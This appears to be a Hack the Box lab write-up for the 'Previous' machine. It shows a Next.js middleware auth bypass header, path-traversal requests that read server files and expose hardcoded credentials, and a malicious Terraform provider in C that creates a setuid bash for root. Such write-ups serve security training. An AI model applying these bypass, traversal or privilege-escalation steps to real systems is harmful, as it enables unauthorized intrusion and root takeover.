# Hack the Box - Previous - Writeup


1, Running nmap scan

`$ nmap -p- -A -sCV 10.129.242.162 -oN nmap.txt`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 01:44 EST
Nmap scan report for previous.htb (10.129.242.162)
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   37.15 ms 10.10.14.1
2   37.21 ms previous.htb (10.129.242.162)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.37 seconds
```
Ports 22 and 80 are open and also can see the domain name. 

2. Add to the /etc/hosts

`$ sudo nano /etc/hosts`

```
127.0.0.1       localhost
10.129.242.162 previous.htb
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

3. Visit the browser. We can see a 'Get Started'. 

<img width="1916" height="547" alt="image" src="https://github.com/user-attachments/assets/00d3e54c-761f-44f5-9da2-5bc5d32b4605" />

The URL has something different. The callback URL from the API points to an internal resource.

<img width="1914" height="802" alt="image" src="https://github.com/user-attachments/assets/383b82b4-3718-4776-9e2c-87dc399ea663" />

Enumerate the web and framework using Wappalyzer

<img width="497" height="545" alt="image" src="https://github.com/user-attachments/assets/e370d47d-5ccf-4cfb-960f-46040ecd55a8" />

Searching for an exploit

Searchbar `next.js 15.2.2` -> Exploitdb

<img width="1898" height="821" alt="image" src="https://github.com/user-attachments/assets/de906689-9ac3-4715-982f-0d5b275cd76b" />

Click to this link:  https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/

<img width="1529" height="749" alt="image" src="https://github.com/user-attachments/assets/6b78a3a0-1463-4800-84f4-d313516166d2" />

Scroll down to this part

`x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware`

<img width="1083" height="312" alt="image" src="https://github.com/user-attachments/assets/45bb82be-b757-4c3f-a2a2-df90195bb98c" />

3. Burp Suite

Find the request and send it to repeater. Modify the request.

<img width="1590" height="551" alt="image" src="https://github.com/user-attachments/assets/a433b4a3-4fcf-44c4-92b8-17692db7e51f" />

<img width="628" height="423" alt="image" src="https://github.com/user-attachments/assets/905ee27b-fde9-4f34-83bb-98ef97a9e2f6" />

<img width="1605" height="795" alt="image" src="https://github.com/user-attachments/assets/3fabff05-4afb-4a49-8170-e525d60248a1" />

It works we are able to bypass the auth. Go back to the proxy and send the request again with modifications. 

Intercept in Burp Suite

<img width="1591" height="789" alt="image" src="https://github.com/user-attachments/assets/8622e261-c216-4b0b-82b5-3cbb714ed818" />

It will bring to this page. Click around. 

<img width="1910" height="764" alt="image" src="https://github.com/user-attachments/assets/09d68135-1ca4-4a22-89e4-9a672c012003" />

auto-add the header in the proxy settings

<img width="1491" height="592" alt="image" src="https://github.com/user-attachments/assets/c0a5d8d4-efab-4b76-8143-68d95dc14dd3" />
<img width="1278" height="290" alt="image" src="https://github.com/user-attachments/assets/28fd5438-33d7-4ae3-9420-98787421420a" />


Inside the docs we don’t see anything. Try to to find hidden directory listings. 

`gobuster dir -u http://previous.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster.txt`

```
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 308) [Size: 71] [--> /%23%20license,%20visit%20http:/creativecommons.org/licenses/by-sa/3.0/]                                                                 
/docs                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
/api                  (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]   <-------------- here
/signin               (Status: 200) [Size: 3481]
```

Lets try to find more about the `/api` directory.

`$ gobuster dir -u http://previous.htb/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusetr.txt -t 50 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'`

```
Progress: 9327 / 220559 (4.23%)Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/api/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 28]  <---------------------- here
```
We found /download.

Go back to burp in repeater and see if the endpoint is reachable.

<img width="673" height="230" alt="image" src="https://github.com/user-attachments/assets/47375f05-c23b-4282-aed5-c2d430bf7954" />

Another scan for the downloads
`$ sudo ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w /usr/share/wordlists/dirb/common.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2` 
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=a
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 2
________________________________________________

Documents and Settings  [Status: 400, Size: 0, Words: 1, Lines: 1, Duration: 89ms]
example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 236ms]  <-------------
Program Files           [Status: 400, Size: 0, Words: 1, Lines: 1, Duration: 93ms]
reports list            [Status: 400, Size: 0, Words: 1, Lines: 1, Duration: 194ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Burp Suite put the parameters and try LFI

<img width="1257" height="227" alt="image" src="https://github.com/user-attachments/assets/851b49fc-7ddb-4977-9b1d-7d1009a1a1ab" />
<img width="476" height="467" alt="image" src="https://github.com/user-attachments/assets/8417c9ae-81ee-4421-a6c3-a920f506198f" />

Two users, node and nextjs, were found. Checking the environment variables, the startup path was found to be /app

<img width="1578" height="390" alt="image" src="https://github.com/user-attachments/assets/4302c810-fa73-4d18-912d-2bcbcab493f9" />

Search and take a look at the Next.js directory examples: 

look at this one:

https://medium.com/@mertenercan/nextjs-13-folder-structure-c3453d780366

or this one:

https://nextjs.org/docs/app/api-reference/file-conventions/metadata/manifest

<img width="1889" height="904" alt="image" src="https://github.com/user-attachments/assets/d6e0f259-aaee-4827-a1ac-491fec6fb29a" />

Finding a directory that contains info related to route config. This includes the authentication logic part that we are interested in./api/auth/[...nextauth]

`GET /api/download?example=../../../../app/.next/routes-manifest.json HTTP/1.1`

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 20 Jan 2026 08:50:30 GMT
Content-Type: application/zip
Content-Length: 2548
Connection: keep-alive
Content-Disposition: attachment; filename="routes-manifest.json"
ETag: "9g13nceds96qd"

{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ],
  "staticRoutes": [
    {
      "page": "/",
      "regex": "^/(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/(?:/)?$"
    },
    {
      "page": "/docs",
      "regex": "^/docs(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs(?:/)?$"
    },
    {
      "page": "/docs/components/layout",
      "regex": "^/docs/components/layout(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/layout(?:/)?$"
    },
    {
      "page": "/docs/components/sidebar",
      "regex": "^/docs/components/sidebar(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/sidebar(?:/)?$"
    },
    {
      "page": "/docs/content/examples",
      "regex": "^/docs/content/examples(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/examples(?:/)?$"
    },
    {
      "page": "/docs/content/getting-started",
      "regex": "^/docs/content/getting\\-started(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
    },
    {
      "page": "/signin",
      "regex": "^/signin(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/signin(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
    "prefetchHeader": "Next-Router-Prefetch",
    "didPostponeHeader": "x-nextjs-postponed",
    "contentTypeHeader": "text/x-component",
    "suffix": ".rsc",
    "prefetchSuffix": ".prefetch.rsc",
    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
    "prefetchSegmentSuffix": ".segment.rsc",
    "prefetchSegmentDirSuffix": ".segments"
  },
  "rewriteHeaders": {
    "pathHeader": "x-nextjs-rewritten-path",
    "queryHeader": "x-nextjs-rewritten-query"
  },
  "rewrites": []
}
```

Use curl to get to the authenticion logic

`curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'`

```
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

Username and Password found
```
username: jeremy
password: MyNameIsJeremyAndILovePancakes
```

login
```
$ ssh jeremy@previous.htb
password: MyNameIsJeremyAndILovePancakes
```

User.txt

```
jeremy@previous:~$ ls
docker  user.txt
jeremy@previous:~$ cat user.txt
87XXXXXXXXXXXXXXXXXXX5e8
```

Now for PrvEsc, we first try to see sudo permissions and dwe can see this:

```
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

It means we are able to run /usr/bin/terraform -chdir\=/opt/examples apply as a root.

Let’s run the file binary to chack it behaviour and the output is:

```
jeremy@previous:~$ sudo /usr/bin/terraform -chdir\=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /usr/local/go/bin
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the
│ state to become incompatible with published releases.
╵
examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]

No changes. Your infrastructure matches the configuration.

Terraform has compared your real infrastructure against your configuration and found no differences, so no changes
are needed.

Apply complete! Resources: 0 added, 0 changed, 0 destroyed.

Outputs:

destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"
```

Look closely at `destination_path = "/home/jeremy/docker/previous/public/examples/hello-world.ts"`

Now lets check our home directory by using 

`ls -all` 

and we can found another interesting file called .terraformrc.

By checking the file we can see tha file contant:
```
jeremy@previous:~$ cat .terraformrc
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

We can make it point to a directory we create, inside of this directory, we can create a malicious provider which will create a setuid shell, let’s do this:

```
mkdir /home/jeremy/emni

cd /tmp
vim exploit.c

    #include <stdlib.h>
    int main() {
        system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash");
        return 0;
    }

gcc -o /home/jeremy/emni/terraform-provider-examples /tmp/exploit.c

chmod +x /home/jeremy/emni/terraform-provider-examples
```

Now modify the .terraformrc file to point to our directory:

```
nano terraformrc
```
```
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/home/jeremy/emni"
        }
        direct {}
}
```

Now we can run the binary:

```
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

And go to /tmp directory and check we can get the bash binary.

```
$ ls -all /tmp
```
```
total 1416
drwxrwxrwt 12 root   root      4096 Jan 20 09:13 .
drwxr-xr-x 18 root   root      4096 Aug 21 20:23 ..
-rwsr-xr-x  1 root   root   1396520 Jan 20 09:12 bash
-rw-rw-r--  1 jeremy jeremy     126 Jan 20 09:07 exploit.c
drwxrwxrwt  2 root   root      4096 Jan 20 06:37 .font-unix
drwxrwxrwt  2 root   root      4096 Jan 20 06:37 .ICE-unix
drwx------  3 root   root      4096 Jan 20 06:37 systemd-private-b704ce8a13334047ad21a194a636de76-ModemManager.service-zG6ALS                                                                                                           
drwx------  3 root   root      4096 Jan 20 06:37 systemd-private-b704ce8a13334047ad21a194a636de76-systemd-logind.service-YWOpkP                                                                                                         
drwx------  3 root   root      4096 Jan 20 06:37 systemd-private-b704ce8a13334047ad21a194a636de76-systemd-resolved.service-7wK7WS                                                                                                       
drwx------  3 root   root      4096 Jan 20 06:37 systemd-private-b704ce8a13334047ad21a194a636de76-systemd-timesyncd.service-kgiKZU                                                                                                      
drwxrwxrwt  2 root   root      4096 Jan 20 06:37 .Test-unix
drwx------  2 root   root      4096 Jan 20 06:37 vmware-root_703-3988031936
drwxrwxrwt  2 root   root      4096 Jan 20 06:37 .X11-unix
drwxrwxrwt  2 root   root      4096 Jan 20 06:37 .XIM-unix
```

Now run the following command to get root shell

```
/tmp/bash -p
```
Check user

```
jeremy@previous:~$ /tmp/bash -p
bash-5.1# whoami
root
bash-5.1# 
```

root.txt

```
bash-5.1# cd /root
bash-5.1# ls
clean  examples  go  root.txt
bash-5.1# cat root.txt
a3XXXXXXXXXXXXXXXXX5a11b
```



